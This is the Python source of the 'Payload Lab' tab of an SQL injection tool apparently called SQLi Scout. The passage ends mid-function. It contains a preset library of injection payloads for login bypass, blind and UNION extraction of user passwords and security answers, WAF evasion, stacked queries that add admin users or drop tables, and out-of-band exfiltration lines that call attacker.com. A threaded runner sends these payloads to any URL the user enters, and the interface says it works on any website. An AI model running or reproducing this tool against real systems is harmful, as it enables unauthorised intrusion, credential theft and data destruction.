
# payload_lab.py - Payload Lab Tab
# Preset library and custom payload runner for SQLi Scout

import time
import json
import threading
import requests

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QTableWidget, QTableWidgetItem,
    QComboBox, QSplitter, QFrame, QHeaderView, QAbstractItemView,
    QTreeWidget, QTreeWidgetItem, QCheckBox, QSpinBox, QGroupBox,
    QSizePolicy, QApplication, QScrollArea
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QSize
from PyQt5.QtGui import QColor, QFont


# Preset Payload Library

PRESET_LIBRARY = {

    "Auth Bypass": {
        "description": "Log in without valid credentials",
        "payloads": [
            ("admin'--",                    "Classic admin bypass"),
            ("admin' #",                    "MySQL comment bypass"),
            ("' OR '1'='1",                 "Always-true string"),
            ("' OR 1=1--",                  "Always-true numeric"),
            ("' OR 1=1#",                   "MySQL hash comment"),
            ("' OR 'x'='x",                 "String equality bypass"),
            ("admin'/*",                    "Block comment bypass"),
            ("') OR ('1'='1",               "Parenthesis wrapped"),
            ("' OR 1=1 LIMIT 1--",          "With LIMIT clause"),
            ("admin' AND '1'='1",           "AND-based bypass"),
            ("\" OR \"\"=\"",               "Double-quote variant"),
            ("' OR ''='",                   "Empty string compare"),
            ("1' OR '1'='1'--",             "Numeric prefix"),
            ("' OR 2>1--",                  "Comparison bypass"),
            ("anything' OR 'x'='x",         "Any username bypass"),
        ],
    },

    "Error Triggers": {
        "description": "Force the database to reveal error messages",
        "payloads": [
            ("'",                           "Single quote - simplest test"),
            ("''",                          "Double single quote"),
            ("\"",                          "Double quote"),
            ("\\",                          "Backslash escape"),
            ("';",                          "Statement terminator"),
            ("' AND 1=CONVERT(int,'a')--",  "MSSQL type error"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "MySQL XPATH error"),
            ("' OR UPDATEXML(1,CONCAT(0x7e,version()),1)--",   "MySQL UPDATEXML error"),
            ("1 AND 1=2 UNION SELECT 1--",  "UNION mismatch error"),
            ("' HAVING 1=1--",              "GROUP BY / HAVING error"),
            ("' GROUP BY 1,2 HAVING 1=1--", "Multi-column HAVING"),
            ("1/(SELECT 0)--",              "Division by zero"),
            ("' OR 1=1 INTO OUTFILE '/tmp/x'--", "File write error"),
        ],
    },

    "Boolean Blind": {
        "description": "Infer data via true/false response differences",
        "payloads": [
            ("' AND 1=1--",                 "Always true"),
            ("' AND 1=2--",                 "Always false"),
            ("' AND 'a'='a'--",             "String true"),
            ("' AND 'a'='b'--",             "String false"),
            ("1 AND 1=1",                   "Numeric true (no quotes)"),
            ("1 AND 1=2",                   "Numeric false (no quotes)"),
            ("' AND LENGTH(database())>0--","DB name exists"),
            ("' AND SUBSTRING(database(),1,1)='a'--", "DB name starts with a"),
            ("' AND (SELECT COUNT(*) FROM Users)>0--", "Users table exists"),
            ("' AND (SELECT COUNT(*) FROM sqlite_master)>0--", "SQLite master check"),
            ("' AND ASCII(SUBSTRING(database(),1,1))>90--", "ASCII comparison"),
            ("') AND (1=1)--",              "Parenthesis wrapped true"),
            ("') AND (1=2)--",              "Parenthesis wrapped false"),
        ],
    },

    "Time-Based Blind": {
        "description": "Confirm injection by measuring response delay",
        "payloads": [
            ("'; SLEEP(5)--",               "MySQL SLEEP - 5s"),
            ("' OR SLEEP(5)--",             "MySQL OR SLEEP"),
            ("' AND SLEEP(5)--",            "MySQL AND SLEEP"),
            ("1; SLEEP(5)--",               "Numeric prefix SLEEP"),
            ("'; WAITFOR DELAY '0:0:5'--",  "MSSQL WAITFOR"),
            ("'; SELECT pg_sleep(5)--",     "PostgreSQL sleep"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Subquery SLEEP"),
            ("' OR SLEEP(5)#",              "MySQL hash comment SLEEP"),
            ("'; SLEEP(3)--",               "Shorter 3s delay"),
            ("1 OR SLEEP(5)",               "No-quote numeric SLEEP"),
            ("' AND RANDOMBLOB(200000000)--", "SQLite heavy compute"),
            ("'; SELECT RANDOMBLOB(500000000)--", "SQLite larger compute"),
        ],
    },

    "Union Extraction": {
        "description": "Pull real data out once injection is confirmed",
        "payloads": [
            ("' ORDER BY 1--",              "Column count probe - 1"),
            ("' ORDER BY 2--",              "Column count probe - 2"),
            ("' ORDER BY 3--",              "Column count probe - 3"),
            ("' UNION SELECT NULL--",        "1-column NULL probe"),
            ("' UNION SELECT NULL,NULL--",   "2-column NULL probe"),
            ("' UNION SELECT NULL,NULL,NULL--","3-column NULL probe"),
            ("' UNION SELECT 'SQISCOUT',NULL--", "Reflected string probe"),
            ("' UNION SELECT sqlite_version(),NULL--", "SQLite version"),
            ("' UNION SELECT group_concat(name,'|'),NULL FROM sqlite_master WHERE type='table'--", "List all tables"),
            ("' UNION SELECT group_concat(email||':'||password,'|'),NULL FROM Users--", "Dump Users"),
            ("' UNION SELECT group_concat(id||'~'||email||'~'||password||'~'||role,'|'),NULL FROM Users--", "Full user dump"),
            ("' UNION SELECT group_concat(sql),NULL FROM sqlite_master--", "Full schema"),
            ("' UNION SELECT group_concat(answer,'|'),NULL FROM SecurityAnswers--", "Security answers"),
            ("' UNION SELECT @@version,NULL--", "MySQL/MSSQL version"),
            ("' UNION SELECT version(),NULL--", "PostgreSQL version"),
        ],
    },

    "WAF Bypass": {
        "description": "Evade simple signature-based filters",
        "payloads": [
            ("'/**/OR/**/1=1--",            "Comment-injected OR"),
            ("' /*!OR*/ 1=1--",             "MySQL version comment"),
            ("%27 OR 1=1--",                "URL-encoded quote"),
            ("%27%20OR%201%3D1--",          "Fully URL-encoded"),
            ("' oR '1'='1",                 "Mixed case"),
            ("' Or 1=1--",                  "Partial mixed case"),
            ("'\tOR\t1=1--",                "Tab as whitespace"),
            ("'\nOR\n1=1--",                "Newline as whitespace"),
            ("' OR/**/ 1=1--",              "Comment-space hybrid"),
            ("%00' OR 1=1--",               "Null byte prefix"),
            ("' /*!UNION*/ /*!SELECT*/ NULL--", "Versioned UNION"),
            ("' UN/**/ION SE/**/LECT NULL--", "Split keywords"),
            ("';EXEC(CHAR(83,76,69,69,80,40,53,41))--", "CHAR() encoded SLEEP"),
        ],
    },

    "Database Recon": {
        "description": "Fingerprint the database and enumerate structure",
        "payloads": [
            ("' UNION SELECT @@version,NULL--",  "MySQL/MSSQL version"),
            ("' UNION SELECT version(),NULL--",   "PostgreSQL version"),
            ("' UNION SELECT sqlite_version(),NULL--", "SQLite version"),
            ("' UNION SELECT database(),NULL--",  "Current DB name (MySQL)"),
            ("' UNION SELECT schema_name,NULL FROM information_schema.schemata--", "All databases"),
            ("' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--", "MySQL tables"),
            ("' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", "SQLite tables"),
            ("' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--", "Column names"),
            ("' UNION SELECT user(),NULL--",      "Current DB user"),
            ("' UNION SELECT current_user,NULL--","PostgreSQL current user"),
            ("' UNION SELECT @@datadir,NULL--",   "MySQL data directory"),
            ("' UNION SELECT @@hostname,NULL--",  "Server hostname"),
            ("'; SELECT name FROM sysobjects WHERE xtype='U'--", "MSSQL user tables"),
        ],
    },

    "Stacked Queries": {
        "description": "Inject a second statement after the first (write/modify)",
        "payloads": [
            ("1; SELECT 1",                 "Basic statement test"),
            ("1'; SELECT SLEEP(5)--",       "Stacked with delay"),
            ("'; INSERT INTO Users(email,password,role) VALUES('hacked@x.com','hacked','admin')--", "Insert admin user"),
            ("'; UPDATE Users SET role='admin' WHERE email='test@test.com'--", "Privilege escalation"),
            ("'; DROP TABLE Users--",        "Drop table (destructive!)"),
            ("'; CREATE TABLE sqout(x TEXT)--", "Create recon table"),
            ("'; INSERT INTO sqout SELECT group_concat(email||':'||password) FROM Users--", "Exfil to own table"),
        ],
    },

    "Out-of-Band": {
        "description": "Exfiltrate data via DNS or HTTP callbacks",
        "payloads": [
            ("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--", "Read /etc/passwd (MySQL)"),
            ("' INTO OUTFILE '/tmp/sqout.txt'--", "Write to file (MySQL)"),
            ("'; EXEC xp_cmdshell('whoami')--",   "MSSQL command exec"),
            ("'; EXEC xp_cmdshell('nslookup $(whoami).attacker.com')--", "DNS exfil (MSSQL)"),
            ("' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user),NULL FROM dual--", "Oracle HTTP exfil"),
        ],
    },
}


# Runner Worker Thread

class RunnerWorker(QThread):
    result_signal = pyqtSignal(dict)
    done_signal   = pyqtSignal(int)   # total run count

    def __init__(self, jobs: list, config: dict):
        """
        jobs: list of {"payload": str, "label": str}
        config: {url, param, method, data_field, inject_json,
                 timeout, delay, cookies, headers}
        """
        super().__init__()
        self.jobs   = jobs
        self.config = config
        self._stop  = False

    def stop(self):
        self._stop = True

    def run(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 SQLiScout/PayloadLab",
            "Accept":     "text/html,application/json,*/*",
        })
        if self.config.get("headers"):
            session.headers.update(self.config["headers"])
        if self.config.get("cookies"):
            session.cookies.update(self.config["cookies"])

        url     = self.config["url"]
        param   = self.config["param"]
        method  = self.config["method"].upper()
        timeout = self.config.get("timeout", 10)
        delay   = self.config.get("delay", 0)

        try:
            for i, job in enumerate(self.jobs):
                if self._stop:
                    break

                payload = job["payload"]
                label   = job.get("label", "")
                t_start = time.perf_counter()

                try:
                    if method == "GET":
                        resp = session.get(url, params={param: payload}, timeout=timeout)
                    elif self.config.get("inject_json"):
                        body = dict(self.config.get("json_body") or {})
                        body[param] = payload
                        resp = session.post(url, json=body, timeout=timeout)
                    else:
                        body = dict(self.config.get("form_body") or {})
                        body[param] = payload
                        resp = session.post(url, data=body, timeout=timeout)

                    elapsed = time.perf_counter() - t_start

                    # Quick heuristic flags
                    body_low = resp.text.lower()
                    has_error = any(sig in body_low for sig in [
                        "sqlite", "syntax error", "sql error", "mysql",
                        "warning:", "exception", "ora-", "pg_query", "sqlstate",
                        "unterminated", "near \"", "sql syntax"
                    ])

                    self.result_signal.emit({
                        "index":     i + 1,
                        "payload":   payload,
                        "label":     label,
                        "status":    resp.status_code,
                        "length":    len(resp.text),
                        "time":      round(elapsed, 3),
                        "flagged":   has_error or elapsed > self.config.get("time_threshold", 4),
                        "flag_reason": ("Error string" if has_error else ("Slow response" if elapsed > self.config.get("time_threshold",4) else "")),
                        "response_snippet": resp.text[:1000],
                    })

                except requests.exceptions.Timeout:
                    elapsed = time.perf_counter() - t_start
                    self.result_signal.emit({
                        "index":   i + 1,
                        "payload": payload,
                        "label":   label,
                        "status":  "TIMEOUT",
                        "length":  0,
                        "time":    round(elapsed, 3),
                        "flagged": True,
                        "flag_reason": "Request timeout",
                        "response_snippet": "",
                    })
                except Exception as e:
                    self.result_signal.emit({
                        "index":   i + 1,
                        "payload": payload,
                        "label":   label,
                        "status":  "ERROR",
                        "length":  0,
                        "time":    0,
                        "flagged": False,
                        "flag_reason": str(e),
                        "response_snippet": "",
                    })

                if delay:
                    time.sleep(delay)
        finally:
            print("[DEBUG] Emitting done_signal from worker")
            self.done_signal.emit(len(self.jobs))


# Response Viewer Dialog

class ResponseViewer(QFrame):
    def __init__(self):
        super().__init__()
        self.setStyleSheet("""
            QFrame {
                background: #141C2B;
                border-left: 1px solid #2A3A52;
            }
        """)
        self.setMinimumWidth(280)

        # payload_lab.py - Payload Lab Tab
        # Preset library and custom payload runner for SQLi Scout
        layout = QVBoxLayout(self)
        layout.setContentsMargins(14, 14, 14, 14)
        layout.setSpacing(8)

        title = QLabel("Response Preview")
        title.setStyleSheet("font-size:13px;font-weight:700;color:#E2E8F0;")
        layout.addWidget(title)

        self.meta_label = QLabel("Select a row to preview the response.")
        self.meta_label.setStyleSheet("font-size:11px;color:#94A3B8;")
        self.meta_label.setWordWrap(True)
        layout.addWidget(self.meta_label)

        self.resp_box = QTextEdit()
        self.resp_box.setReadOnly(True)
        self.resp_box.setStyleSheet("""
            QTextEdit {
                background: #0A1120;
                color: #94A3B8;
                border-radius: 8px;
                padding: 10px;
                font-family: "Cascadia Code","Fira Code",Consolas,monospace;
                font-size: 11px;
            }
        """)
        layout.addWidget(self.resp_box)

        self.flag_box = QFrame()
        self.flag_box.setStyleSheet("""
            QFrame {
                background: #3D1F1F;
                border: 1px solid #7F1D1D;
                border-radius: 8px;
                padding: 8px;
            }
        """)
        flag_layout = QVBoxLayout(self.flag_box)
        flag_layout.setContentsMargins(10, 8, 10, 8)
        self.flag_title = QLabel("Potential Injection Detected")
        self.flag_title.setStyleSheet("font-size:12px;font-weight:700;color:#F87171;")
        self.flag_reason = QLabel("")
        self.flag_reason.setStyleSheet("font-size:11px;color:#B91C1C;")
        flag_layout.addWidget(self.flag_title)
        flag_layout.addWidget(self.flag_reason)
        self.flag_box.hide()
        layout.addWidget(self.flag_box)

    def show_result(self, result: dict):
        status = result.get("status", "?")
        length = result.get("length", 0)
        t      = result.get("time", 0)
        self.meta_label.setText(
            f"Status: {status}   |   Length: {length} bytes   |   Time: {t}s"
        )
        snippet = result.get("response_snippet", "")
        # Highlight error keywords and pretty-print JSON
        error_keywords = [
            "sqlite", "syntax error", "sql error", "mysql",
            "warning:", "exception", "ora-", "pg_query", "sqlstate",
            "unterminated", "near ", "sql syntax", "error", "fail"
        ]
        highlighted = snippet
        # Try to pretty-print JSON if response is JSON
        import json
        try:
            parsed = json.loads(snippet)
            pretty = json.dumps(parsed, indent=2)
            highlighted = pretty
        except Exception:
            # Not JSON, highlight error keywords
            for word in error_keywords:
                if word in highlighted.lower():
                    # Simple HTML highlight
                    highlighted = highlighted.replace(
                        word, f"<span style='background:#F87171;color:#fff;'>{word}</span>"
                    )
        # Set as HTML if highlighted, else plain text
        if "<span style='background:#F87171;color:#fff;'" in highlighted:
            self.resp_box.setHtml(highlighted)
        else:
            self.resp_box.setPlainText(highlighted if highlighted else "(empty response)")

        if result.get("flagged"):
            self.flag_reason.setText(result.get("flag_reason", ""))
            self.flag_box.show()
        else:
            self.flag_box.hide()


# Payload Lab Tab Widget

class PayloadLabTab(QWidget):
    def _show_no_results_placeholder(self):
        self.results_table.setRowCount(1)
        for col in range(self.results_table.columnCount()):
            item = QTableWidgetItem("No results found" if col == 1 else "")
            item.setForeground(QColor("#64748B"))
            item.setTextAlignment(Qt.AlignCenter)
            self.results_table.setItem(0, col, item)
        self.results_table.setRowHeight(0, 48)

    def _add_flagged_toggle(self, layout):
        # Checkbox to show only flagged results
        from PyQt5.QtWidgets import QCheckBox
        self.show_flagged_only = QCheckBox("Show only flagged results")
        self.show_flagged_only.setStyleSheet("color:#F87171;font-size:12px;")
        self.show_flagged_only.stateChanged.connect(self._filter_results_table)
        layout.addWidget(self.show_flagged_only)

    def _filter_results_table(self):
        # Show only flagged results if checked
        show_flagged = getattr(self, "show_flagged_only", None)
        if not show_flagged:
            return
        only_flagged = show_flagged.isChecked()
        self.results_table.setRowCount(0)
        shown = 0
        for result in self._results:
            if only_flagged and not result.get("flagged"):
                continue
            self._add_result_row(result)
            shown += 1
        if shown == 0:
            self._show_no_results_placeholder()
        self.results_table.scrollToBottom()
        self.results_table.resizeColumnsToContents()

    def _add_result_row(self, result: dict):
        # Add a row to the results table
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        self.results_table.setRowHeight(row, 54)
        flagged = result.get("flagged", False)
        bg = QColor("#3D1F1F") if flagged else (QColor("#232F41") if row % 2 == 1 else QColor("#212D42"))
        font = QFont("Cascadia Code", 12)
        def cell(text, color="#E2E8F0", bold=False, align=Qt.AlignLeft | Qt.AlignVCenter, wrap=False):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(color))
            item.setBackground(bg)
            item.setFont(font)
            if bold:
                f = item.font()
                f.setBold(True)
                item.setFont(f)
            item.setTextAlignment(align)
            if wrap:
                item.setData(Qt.TextAlignmentRole, Qt.AlignLeft | Qt.AlignVCenter)
            if isinstance(text, str) and len(text) > 40:
                item.setToolTip(text)
            return item
        status  = result.get("status", "?")
        s_color = "#34D399" if status == 200 else ("#F87171" if str(status).startswith(("4","5")) or status in ("ERROR","TIMEOUT") else "#FBBF24")
        t       = result.get("time", 0)
        t_color = "#F87171" if t >= self.cfg_time_flag.value() else "#94A3B8"
        label   = result.get("label", "")
        self.results_table.setItem(row, 0, cell(result["index"], "#64748B", align=Qt.AlignCenter|Qt.AlignVCenter))
        self.results_table.setItem(row, 1, cell(result["payload"], wrap=True))
        self.results_table.setItem(row, 2, cell(label, "#94A3B8", wrap=True))
        self.results_table.setItem(row, 3, cell(status, s_color, align=Qt.AlignCenter|Qt.AlignVCenter))
        self.results_table.setItem(row, 4, cell(result.get("length", ""), "#94A3B8", align=Qt.AlignRight|Qt.AlignVCenter))
        self.results_table.setItem(row, 5, cell(f"{t:.3f}", t_color, align=Qt.AlignRight|Qt.AlignVCenter))
        if flagged:
            reason = result.get("flag_reason", "Flagged")
            fi = QTableWidgetItem(f"Flagged: {reason}")
            fi.setForeground(QColor("#F87171"))
            fi.setBackground(bg)
            fi.setFont(QFont("Segoe UI", 12, QFont.Bold))
            if len(reason) > 40:
                fi.setToolTip(reason)
            self.results_table.setItem(row, 6, fi)
        else:
            self.results_table.setItem(row, 6, cell("", "#64748B"))

    def __init__(self):
        super().__init__()
        self._worker     = None
        self._results    = []
        self._all_presets = []   # flat list of (category, payload, label)
        self._build_ui()
        self._populate_preset_tree()

    # ─────────────────────────────────────────────────────────────────────────
    # UI
    # ─────────────────────────────────────────────────────────────────────────

    def _build_ui(self):
        root = QHBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        splitter = QSplitter(Qt.Horizontal)
        splitter.setHandleWidth(1)
        splitter.setStyleSheet("QSplitter::handle { background: #263347; }")

        # ── Left panel: preset library ────────────────────────────────────────
        left = self._build_left_panel()

        # ── Center panel: editor + target + results ───────────────────────────
        center = self._build_center_panel()

        # ── Right panel: response viewer ──────────────────────────────────────
        self.response_viewer = ResponseViewer()

        splitter.addWidget(left)
        splitter.addWidget(center)
        splitter.addWidget(self.response_viewer)
        splitter.setSizes([280, 680, 320])

        root.addWidget(splitter)

    def _build_left_panel(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet("background:#141C2B;border-right:1px solid #E5E7EB;")
        layout = QVBoxLayout(w)
        layout.setContentsMargins(12, 14, 12, 12)
        layout.setSpacing(8)

        title = QLabel("Preset Library")
        title.setStyleSheet("font-size:13px;font-weight:700;color:#E2E8F0;")
        layout.addWidget(title)

        self.preset_search = QLineEdit()
        self.preset_search.setPlaceholderText("Search payloads…")
        self.preset_search.setStyleSheet("""
            QLineEdit {
                background: #212D42;
                border: 1px solid #2A3A52;
                border-radius: 7px;
                padding: 6px 10px;
                font-size: 12px;
            }
            QLineEdit:focus { border-color: #4C8EF7; }
        """)
        self.preset_search.textChanged.connect(self._filter_presets)
        layout.addWidget(self.preset_search)

        self.preset_tree = QTreeWidget()
        self.preset_tree.setHeaderHidden(True)
        self.preset_tree.setStyleSheet("""
            QTreeWidget {
                background: transparent;
                border: none;
                font-size: 12px;
            }
            QTreeWidget::item {
                padding: 4px 6px;
                border-radius: 5px;
                color: #E2E8F0;
            }
            QTreeWidget::item:hover {
                background: #1E3A6E;
                color: #4C8EF7;
            }
            QTreeWidget::item:selected {
                background: #1E3A6E;
                color: #4C8EF7;
            }
            QTreeWidget::branch { background: transparent; }
        """)
        self.preset_tree.setIndentation(16)
        self.preset_tree.itemDoubleClicked.connect(self._on_preset_double_click)
        layout.addWidget(self.preset_tree)

        # Buttons below tree
        btn_row = QHBoxLayout()
        add_btn = QPushButton("+ Add to Editor")
        add_btn.setStyleSheet("""
            QPushButton {
                background: #4C8EF7;
                color: white;
                border: none;
                border-radius: 7px;
                padding: 7px 12px;
                font-size: 12px;
                font-weight: 600;
            }
            QPushButton:hover { background: #2563EB; }
        """)
        add_btn.setCursor(Qt.PointingHandCursor)
        add_btn.clicked.connect(self._add_selected_to_editor)

        add_all_btn = QPushButton("+ Add Category")
        add_all_btn.setStyleSheet("""
            QPushButton {
                background: #263347;
                color: #E2E8F0;
                border: 1px solid #2A3A52;
                border-radius: 7px;
                padding: 7px 12px;
                font-size: 12px;
            }
            QPushButton:hover { background: #263347; }
        """)
        add_all_btn.setCursor(Qt.PointingHandCursor)
        add_all_btn.clicked.connect(self._add_category_to_editor)

        btn_row.addWidget(add_btn)
        btn_row.addWidget(add_all_btn)
        layout.addLayout(btn_row)

        return w

    def _build_center_panel(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet("background:#212D42;")
        layout = QVBoxLayout(w)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        # Instructions for universal use
        instructions = QLabel(
            "<b>Instructions:</b> Enter the full target URL and the parameter you want to test. "
            "This works for any website, not just Juice Shop.\n"
            "For POST requests, specify extra body fields as JSON (e.g. {'password':'test'}) or as key=value pairs.\n"
            "Results will show flagged issues, response details, and anomalies."
        )
        instructions.setStyleSheet("font-size:12px;color:#FBBF24;background:transparent;")
        instructions.setWordWrap(True)
        layout.addWidget(instructions)

        # ── Target config row ─────────────────────────────────────────────────
        target_group = QGroupBox("Target")
        target_group.setStyleSheet("""
            QGroupBox {
                font-size:11px; font-weight:700; color:#94A3B8;
                border:1px solid #2A3A52; border-radius:10px;
                margin-top:10px; padding-top:10px;
                background: #212D42;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left:12px; padding:0 6px;
                background:#212D42;
            }
        """)
        tg_layout = QVBoxLayout(target_group)
        tg_layout.setContentsMargins(12, 8, 12, 12)
        tg_layout.setSpacing(8)

        # Row 1: URL + Method
        row1 = QHBoxLayout()
        url_lbl = QLabel("URL")
        url_lbl.setFixedWidth(60)
        url_lbl.setStyleSheet("font-size:12px;color:#94A3B8;font-weight:600;")
        self.target_url = QLineEdit("")
        self.target_url.setStyleSheet(self._input_style())
        method_lbl = QLabel("Method")
        method_lbl.setStyleSheet("font-size:12px;color:#94A3B8;font-weight:600;")
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST (form)", "POST (JSON)"])
        self.method_combo.setFixedWidth(130)
        self.method_combo.setStyleSheet(self._input_style())
        row1.addWidget(url_lbl)
        row1.addWidget(self.target_url)
        row1.addSpacing(8)
        row1.addWidget(method_lbl)
        row1.addWidget(self.method_combo)
        tg_layout.addLayout(row1)

        # Row 2: Param + optional body fields
        row2 = QHBoxLayout()
        param_lbl = QLabel("Parameter")
        param_lbl.setFixedWidth(60)
        param_lbl.setStyleSheet("font-size:12px;color:#94A3B8;font-weight:600;")
        self.target_param = QLineEdit("")
        self.target_param.setPlaceholderText("e.g.  q  /  email  /  id")
        self.target_param.setFixedWidth(140)
        self.target_param.setStyleSheet(self._input_style())
        body_lbl = QLabel("Extra body fields")
        body_lbl.setStyleSheet("font-size:12px;color:#94A3B8;font-weight:600;")
        self.extra_body = QLineEdit()
        self.extra_body.setPlaceholderText('{"password":"test"}  or  password=test')
        self.extra_body.setStyleSheet(self._input_style())
        row2.addWidget(param_lbl)
        row2.addWidget(self.target_param)
        row2.addSpacing(8)
        row2.addWidget(body_lbl)
        row2.addWidget(self.extra_body)
        tg_layout.addLayout(row2)

        # Row 3: timeout + delay + time threshold
        row3 = QHBoxLayout()
        for lbl_text, attr, min_, max_, default, step in [
            ("Timeout (s)",   "cfg_timeout",    3, 60,  10,  1),
            ("Delay (s)",     "cfg_delay",      0, 10,   0,  1),
            ("Time flag (s)", "cfg_time_flag",  1, 30,   4,  1),
        ]:
            lbl = QLabel(lbl_text)
            lbl.setStyleSheet("font-size:11px;color:#94A3B8;")
            spin = QSpinBox()
            spin.setRange(min_, max_)
            spin.setValue(default)
            spin.setFixedWidth(62)
            spin.setStyleSheet(self._spin_style())
            setattr(self, attr, spin)
            row3.addWidget(lbl)
            row3.addWidget(spin)
            row3.addSpacing(8)
        row3.addStretch()
        tg_layout.addLayout(row3)

        layout.addWidget(target_group)

        # ── Payload editor ────────────────────────────────────────────────────
        editor_header = QHBoxLayout()
        editor_title = QLabel("Payload Queue")
        editor_title.setStyleSheet("font-size:13px;font-weight:700;color:#E2E8F0;")

        self.payload_count_lbl = QLabel("0 payloads")
        self.payload_count_lbl.setStyleSheet("font-size:12px;color:#94A3B8;")

        clear_btn = QPushButton("Clear")
        clear_btn.setStyleSheet(self._icon_btn_style())
        clear_btn.setCursor(Qt.PointingHandCursor)
        clear_btn.clicked.connect(self._clear_editor)

        copy_btn = QPushButton("Copy")
        copy_btn.setStyleSheet(self._icon_btn_style())
        copy_btn.setCursor(Qt.PointingHandCursor)
        copy_btn.clicked.connect(self._copy_editor)

        editor_header.addWidget(editor_title)
        editor_header.addSpacing(10)
        editor_header.addWidget(self.payload_count_lbl)
        editor_header.addStretch()
        editor_header.addWidget(copy_btn)
        editor_header.addWidget(clear_btn)
        layout.addLayout(editor_header)

        self.payload_editor = QTextEdit()
        self.payload_editor.setPlaceholderText(
            "One payload per line - paste, type, or double-click presets from the library\n\n"
            "Examples:\n"
            "' OR 1=1--\n"
            "' UNION SELECT sqlite_version(),NULL--\n"
            "admin'--"
        )
        self.payload_editor.setStyleSheet("""
            QTextEdit {
                background: #0A1120;
                color: #E2E8F0;
                border-radius: 10px;
                padding: 12px;
                font-family: "Cascadia Code","Fira Code",Consolas,monospace;
                font-size: 12px;
                line-height: 1.6;
            }
        """)
        self.payload_editor.setMinimumHeight(130)
        self.payload_editor.setMaximumHeight(180)
        self.payload_editor.textChanged.connect(self._update_payload_count)
        layout.addWidget(self.payload_editor)

        # ── Run controls ──────────────────────────────────────────────────────
        run_row = QHBoxLayout()
        self.run_btn = QPushButton("Run Payloads")
        self.run_btn.setStyleSheet("""
            QPushButton {
                background: #10B981;
                color: white;
                border: none;
                border-radius: 9px;
                padding: 10px 24px;
                font-size: 14px;
                font-weight: 600;
                min-height: 40px;
            }
            QPushButton:hover { background: #059669; }
            QPushButton:disabled { background: #9CA3AF; }
        """)
        self.run_btn.setCursor(Qt.PointingHandCursor)
        self.run_btn.clicked.connect(self._run_payloads)

        self.stop_run_btn = QPushButton("Stop")
        self.stop_run_btn.setStyleSheet("""
            QPushButton {
                background: #EF4444;
                color: white;
                border: none;
                border-radius: 9px;
                padding: 10px 20px;
                font-size: 14px;
                font-weight: 600;
                min-height: 40px;
            }
            QPushButton:hover { background: #DC2626; }
        """)
        self.stop_run_btn.setCursor(Qt.PointingHandCursor)
        self.stop_run_btn.clicked.connect(self._stop_run)
        self.stop_run_btn.hide()

        self.run_status = QLabel("")
        self.run_status.setStyleSheet("font-size:12px;color:#94A3B8;")

        clear_results_btn = QPushButton("Clear Results")
        clear_results_btn.setStyleSheet(self._icon_btn_style())
        clear_results_btn.setCursor(Qt.PointingHandCursor)
        clear_results_btn.clicked.connect(self._clear_results)

        export_btn = QPushButton("Export CSV")
        export_btn.setStyleSheet(self._icon_btn_style())
        export_btn.setCursor(Qt.PointingHandCursor)
        export_btn.clicked.connect(self._export_csv)

        run_row.addWidget(self.run_btn)
        run_row.addWidget(self.stop_run_btn)
        run_row.addSpacing(12)
        run_row.addWidget(self.run_status)
        run_row.addStretch()
        run_row.addWidget(clear_results_btn)
        run_row.addWidget(export_btn)
        layout.addLayout(run_row)

        # ── Results table ─────────────────────────────────────────────────────
        results_header = QHBoxLayout()
        results_title = QLabel("Results")
        results_title.setStyleSheet("font-size:13px;font-weight:700;color:#E2E8F0;")
        self.flagged_count = QLabel("")
        self.flagged_count.setStyleSheet("font-size:12px;color:#F87171;font-weight:600;")
        results_header.addWidget(results_title)
        results_header.addSpacing(10)
        results_header.addWidget(self.flagged_count)
        results_header.addStretch()
        layout.addLayout(results_header)

        self.results_table = QTableWidget()
        self.results_table.setColumnCount(7)
        self.results_table.setHorizontalHeaderLabels([
            "#", "Payload", "Description", "Status", "Length", "Time (s)", "Flag"
        ])
        self.results_table.setColumnWidth(0, 36)
        self.results_table.setColumnWidth(2, 180)
        self.results_table.setColumnWidth(3, 65)
        self.results_table.setColumnWidth(4, 70)
        self.results_table.setColumnWidth(5, 70)
        self.results_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.results_table.horizontalHeader().setSectionResizeMode(6, QHeaderView.ResizeToContents)
        self.results_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.results_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.results_table.verticalHeader().setVisible(False)
        self.results_table.setShowGrid(False)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setStyleSheet("""
            QTableWidget {
                background: #212D42;
                border: 1px solid #2A3B52;
                border-radius: 10px;
            }
            QTableWidget::item { padding: 6px 10px; }
            QTableWidget::item:selected { background: #1E3A6E; color: #E2E8F0; }
            QHeaderView::section {
                background: #141C2B;
                color: #94A3B8;
                font-size: 10px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 0.4px;
                padding: 8px 10px;
                border: none;
                border-bottom: 1px solid #E5E7EB;
            }
        """)
        self.results_table.itemSelectionChanged.connect(self._on_result_selected)
        # Add flagged toggle above table
        self._add_flagged_toggle(layout)
        layout.addWidget(self.results_table)

        return w

    # ─────────────────────────────────────────────────────────────────────────
    # Preset tree population
    # ─────────────────────────────────────────────────────────────────────────

    def _populate_preset_tree(self, filter_text: str = ""):
        self.preset_tree.clear()
        self._all_presets = []
        ft = filter_text.lower()

        for category, data in PRESET_LIBRARY.items():
            payloads = data["payloads"]

            # Filter
            if ft:
                payloads = [(p, l) for p, l in payloads
                            if ft in p.lower() or ft in l.lower() or ft in category.lower()]
            if not payloads:
                continue

            cat_item = QTreeWidgetItem([f"{category}  ({len(payloads)})"])
